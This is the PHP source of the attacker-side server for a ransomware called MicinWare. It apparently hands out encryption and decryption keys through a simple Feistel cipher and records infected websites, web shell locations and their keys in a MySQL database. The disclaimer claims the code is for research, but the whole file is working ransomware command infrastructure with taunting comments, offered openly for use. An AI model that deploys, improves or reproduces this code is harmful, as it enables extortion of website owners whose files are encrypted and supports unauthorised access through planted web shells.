<?php
/**
* @author Krypton aka GreyCat aka 0x00b0
* @copyright ExploreOurBrain - 2019
* put into attacker server
* you can modify it and change to another algorithm
* Open Source PHP RansomeWare - MicinWare

* Disclaimer : 
  This source code is for research purpose only, the use of this code is YOUR RESPONSIBILITY
  I take NO responsibility and/or liability for how you choose to use any of this source code. 
  By using of this file, you understand that you are AGREEING TO USE AT YOUR OWN RISK. Once again, 
  Source code available is for EDUCATION and/or RESEARCH purposes ONLY.

  Any actions and/or activities related to the material contained within this source code is solely your responsability. Misuse of the information in this source code can result in criminal charges being brought against the persons in question. I will not be held responsible in the event any criminal charges are brought against any individuals misuing the code in this source code to break the law.
*/



error_reporting(0);//shut up bitch !1!1
$host 	= 'localheart';
$user 	= 'root';
$pass 	= 'root';
$db		= 'micinware-keys';

$string 	= isset($_POST['komposisi']) ? $_POST['komposisi'] : "";
$webshit   	= isset($_POST['you']) ? $_POST['you'] : "";
$infected 	= isset($_POST['micined']) ? $_POST['micined'] : "";
$email 		= isset($_POST['email']) ? $_POST['email'] : "";


switch ($_POST['taburinMicin']) 
{
	case 'Cry':
	    echo FeistelCipherHelper::encode($string);
		break;
	case 'Log':
		MicinLog::log($host,$user,$pass,$db,$string,$webshit,$infected);
		
		if (!empty($email)) 
		{

		}

		break;
	default:
	    echo FeistelCipherHelper::decode($string);
		break;
}

///////////////////////////////
///////// Begin Cipher ///////
//////////////////////////////
class FeistelCipherHelper
{
    public static function encode($str, $i = 5)
    {
        $len = strlen($str);
        if ($len % 2 !== 0)
        {
            $str = $str.' ';
        }
        $str = str_split($str, 2);
        $hash = '';
        foreach ($str as $chr)
        {
            $l = ord(substr($chr, 0, 1));
            $r = ord(substr($chr, 1));
            FeistelCipherAlgorithm::encode($l, $r, $i);
            $l = chr($l);
            $r = chr($r);
            $hash .= $l.$r;
        }
        $hash = trim($hash, ' ');
        $hash = Base64Safe::encode($hash);

        return $hash;
    }

    public static function decode($hash, $i = 5)
    {
        $hash = Base64Safe::decode($hash);
        $len = strlen($hash);
        if ($len % 2 !== 0)
        {
            $hash = $hash.' ';
        }
        $hash = str_split($hash, 2);
        $str = '';
        foreach ($hash as $chr)
        {
            $l = ord(substr($chr, 0, 1));
            $r = ord(substr($chr, 1));
            FeistelCipherAlgorithm::decode($l, $r, $i);
            $l = chr($l);
            $r = chr($r);
            $str .= $l.$r;
        }
        $str = trim($str, ' ');

        return $str;
    }
}

class FeistelCipherAlgorithm
{
    public static function func($block, $key)
    {
        $val = ((2 * $block) + pow(2, $key));

        return $val;
    }

    public static function encode(&$left, &$right, $steps = 5)
    {
        $i = 1;
        while ($i < $steps)
        {
            $temp = $right ^ static::func($left, $i);
            $right = $left;
            $left = $temp;
            $i++;
        }

        $temp = $right;
        $right = $left;
        $left = $temp;
    }

    public static function decode(&$left, &$right, $steps = 5)
    {
        $i = $steps - 1;
        while ($i > 0)
        {
            $temp = $right ^ static::func($left, $i);
            $right = $left;
            $left = $temp;
            $i--;
        }
        $temp = $right;
        $right = $left;
        $left = $temp;
    }
}

class Base64Safe
{
    public static function encode($input)
    {
        $data = base64_encode($input);
    	$data = str_replace(array('+','/','='),array('-','_',''),$data);

    	return $data;
    }

    public static function decode($input)
    {
	    $data = str_replace(array('-','_'),array('+','/'),$input);
	    $mod4 = strlen($data) % 4;
	    if ($mod4) {
	        $data .= substr('====', $mod4);
	    }

	    return base64_decode($data);
    }
}
///////////////////////////////
///////// END Cipher /////////
//////////////////////////////

class MicinLog
{
	
	public function log($host,$user,$pass,$db,$string,$webshit,$infected)
	{
		try {
		   $dbh = new PDO('mysql:host='.$host.';dbname='.$db, $user, $pass);
		 
		   $dbh->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
		 
		   $stmt = $dbh->prepare('INSERT INTO info 
		   VALUES (null,?, ?, ?, ?)');
		 
		   $stmt->bindParam(1, $webshit);
		   $stmt->bindParam(2, $infected);
		   $stmt->bindParam(3, $string);
		   $stmt->bindParam(4, $attacked_at);

		   $webshit=$webshit;
		   $infected = $infected;
		   $string = $string;
		   $attacked_at = date('Y-m-d H:i:s');
		 
		   $stmt->execute();
		   $dbh = null;

		} catch (PDOException $e) {
		   die('FootPrint ??? LoL');
		}
	}
}



?>
